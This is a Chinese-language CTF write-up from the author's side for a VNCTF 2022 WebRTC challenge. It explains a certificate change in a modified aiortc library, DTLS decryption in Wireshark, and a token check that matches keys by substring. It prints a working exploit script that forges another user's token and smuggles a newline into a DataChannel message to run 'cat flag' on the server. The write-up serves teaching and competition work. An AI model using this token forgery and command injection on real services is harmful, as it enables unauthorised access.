---
title: 伽玛实验场｜PDC面壁计划管理系统-出题人视角
contest: VNCTF 2022 PDC面壁计划
year: 2022
difficulty: hard
vuln_type: auth_bypass
tags: [aiortc, WebRTC, DTLS, RSA->EC证书, token验证, PK-SK映射, substring漏洞, DataChannel, RCE]
attack_chain:
  - 附件包: aiortc 库 + app.py + cmdHostory + important.pcapng
  - diff aiortc 主分支与附件: RSA 改为 EC (SECP256R1) 证书体系变更
  - Wireshark 用 SSLKEYLOGFILE 解密 DTLS 信道
  - pcap 发现: tell2me?token=... + WebRTC SDP 交换 + DataChannel 'xiaolanlan:cat flag' (Permission denied)
  - 漏洞: token 校验 substring PK 匹配 PK-SK 映射
  - 服务端遍历 pk2sk 如果 pkKey in pk (substring) → 拿到 sk
  - 攻击: 伪造 weisi 的 token, timeStamp 1674991453000 距今 < 600000ms
  - 用 伟思身份 (weisi=8d509c28896865f8640f328f30f15721) 建立 WebRTC Client
  - 重连重发 'xiaolanlan:cat flag' 拿 flag
key_payload: 'token=md5(timestamp-sk)[:32]+timestamp+pk + WebRTC DataChannel xiaolanlan:cat flag'
one_liner: aiortc WebRTC 证书从 RSA 改 EC + token 验证 substring PK 漏洞，借伟思身份 WebRTC 拿 flag。
lesson: 字典 key in user_substring 漏洞 (应该用 == 严格匹配)；WebRTC 内网穿透靠 TUN/STUN 公司/学校可能判定违规；SSLKEYLOGFILE 通用 DTLS 解密法。
quality: high
---

# 伽玛实验场｜PDC面壁计划管理系统-出题人视角

## 概览
- **来源**: ctfiot 100552 (小蓝蓝师傅投稿)
- **赛事**: VNCTF 2022 PDC面壁计划 (赛后提升难度版)
- **难度**: ⭐⭐⭐⭐

## 附件
- `aiortc` 魔改库
- `app.py` 部分源码
- `cmdHostory` 部分部署命令
- `important.pcapng` 流量包

## 关键发现 1: 证书体系变更
```diff
-from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import ec
+from OpenSSL import SSL, crypto

-def generate_certificate(key: rsa.RSAPrivateKey) -> x509.Certificate:
+def generate_certificate(key: ec.EllipticCurvePrivateKey) -> x509.Certificate:

-key = rsa.generate_private_key(public_exponent=65537, key_size=2048, ...)
+key = ec.generate_private_key(ec.SECP256R1(), default_backend())
```
**RSA → EC SECP256R1** 变更导致 SSL 握手兼容性差，EXP 必须用魔改 aiortc

## 关键发现 2: token 验证漏洞
```python
pk2sk = {"luoji": "", "weisi": "8d509c28896865f8640f328f30f15721"}
submitToken = str(params["token"])
# token = md5(timestamp-sk)[:32] + timestamp + pk
pk = submitToken[45:]  # 提取 PK
sk = ""
for pkKey in pk2sk.keys():
    if pkKey in pk:  # 漏洞: substring 匹配而非 ==
        sk = pk2sk[pkKey]
# signText = timestamp + '-' + sk
# md5(signText) == submitToken[:32]
```
**漏洞**: `pkKey in pk` 是子串匹配，攻击者可以传 "luojiweisi" 同时命中两个 key

## Wireshark DTLS 解密
- 用 SSLKEYLOGFILE 通用密钥日志 (Chrome/Firefox/curl)
- 服务器未使用 (EC)DHE 密码套件时 RSA 私钥即可解密
- 解密后看到 WebRTC DataChannel `xiaolanlan:ls` + `xiaolanlan:cat flag` 触发 `cat: flag: Permission denied`

## 攻击 EXP
```python
import asyncio, json, hashlib, time
import requests
from aiortc import RTCIceCandidate, RTCPeerConnection, RTCSessionDescription
from aiortc.sdp import candidate_from_sdp, candidate_to_sdp

pk = "weisi"
sk = "8d509c28896865f8640f328f30f15721"
url = "http://target/tell2me"

def sendSDPRequest(WRTCConnectionInfo):
    timeStamp = int(round(time.time()) * 1000)
    signText = f"{timeStamp}-{sk}"
    signValue = hashlib.md5(signText.encode()).hexdigest().upper()
    WRTCConnectionInfo["token"] = f"{signValue}{timeStamp}{pk}"
    return requests.post(url, json=WRTCConnectionInfo).text

async def run_offer(pc, signaling):
    channel = pc.createDataChannel("chat")
    
    @channel.on("open")
    def on_open():
        channel.send("xiaolanlan:ls")
        asyncio.sleep(1)
        channel.send("xiaolanlan:\ncat flag")
    
    await pc.setLocalDescription(await pc.createOffer())
    sdpResponse = sendSDPRequest(object_to_string(pc.localDescription))
    obj = object_from_string(sdpResponse)
    await pc.setRemoteDescription(obj)
    await consume_signaling(pc, signaling)
```

## 部署要点
- WebRTC 自动选 UDP 端口 → 必须 `--network host` 模式
- 端口区间映射易失败
- 内网穿透 TUN/STUN 可能被公司/学校判定违规
